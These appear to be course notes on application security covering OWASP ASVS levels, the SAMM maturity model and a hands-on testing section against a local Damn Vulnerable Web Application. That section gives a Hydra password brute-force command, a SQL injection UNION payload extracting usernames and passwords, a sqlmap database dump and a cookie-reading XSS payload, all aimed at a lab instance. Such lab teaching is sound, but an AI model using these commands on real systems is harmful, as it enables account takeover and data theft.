Introduction to AppSec
======================

Critical Concepts of Application Security
-----------------------------------------

Establishing a Baseline with ASVS
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

OWASP ASVS Objectives:

- To provide us with a measurement on how much trust we can place in our web application's security
- To provide guidance as to what we should build into our security controls to satisfy security requirements
- To provide a standard for application security verification requirements in contracts with third parties

OWASP ASVS is a catalog of security requirements and verification data.

Different levels of ASVS for different data sets, and how much trust should be placed in them.

Recommendation is the applications should be at least level 1. Start with level 1 and then iterate on top of that to get to the other levels.
Businesses should aim for level 2, especially for business-critical areas. Level 3 is for when a breach would significantly impact your
organization's operations and/or survival.

Establishing a Baseline with SAMM
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SAMM stands for Software Assurance Maturity Model.

Provides a self-assessment model. Technology and process agnostic.

1. Measurable
2. Actionable
3. Versatile

Great tool for finding and organization's security stance in order to improve it.

SAMM Model Overview

Available online or as a pdf.

+-----------------------+-----------------------+-------------------+-------------------------------+---------------------------+
| Governance            | Design                | Implementation    | Verification                  | Operations                |
+=======================+=======================+===================+===============================+===========================+
| Strategy & Metrics    | Threat Assessment     | Secure Build      | Architecture Assessment       | Incident Management       |
+-----------------------+-----------------------+-------------------+-------------------------------+---------------------------+
| Policy & Compliance   | Security Requirements | Secure Deployment | Requirements-driven Testing   | Environment Management    |
+-----------------------+-----------------------+-------------------+-------------------------------+---------------------------+
| Education & Guidance  | Security Architecture | Defect Management | Security Testing              | Operational Management    |
+-----------------------+-----------------------+-------------------+-------------------------------+---------------------------+


A Practical Approach to Application Security
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Application Security Risks and Threat Modeling
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Web Application Security
------------------------

Mobile Application Security
---------------------------

Application Security in the Cloud
---------------------------------

Application Security Testing
----------------------------


OWASP web security testing guide

Damn vulnerable web application
Github
Docker

.. code: bash

   docker run --rm -it -p 80:80 vulnerables/web-dvwa

admin, password

Brute Force
~~~~~~~~~~~

These tools come pre-installed on Kali Linux

.. code: bash

   gunzip /usr/share/wordlists/rockyou.txt.gz

Hydra
Browser network tab
parameters and cookies

.. code: bash

   hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=sessionidhash; security=low"

SQL Injection
~~~~~~~~~~~~~

.. code: sql

   %' and 1=0 unions select null, concat(user,':',password) from users #

Unserialize password with md5 hash

Sqlmap

.. code: bash

   sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=sessionidhash" -dbs --batch

XSS
~~~

Stored

test

.. code: js

   <script>alert(document.cookie)</script>

Key Takeaways
-------------

NICE framework
SAMM
ASVS
Threat Modeling
Proactive Controls

Understand the top risks

Application Security Testing
----------------------------

Static Analysis
Dynamic Analysis
Manual Review
Pentesting
Documentation and Reports
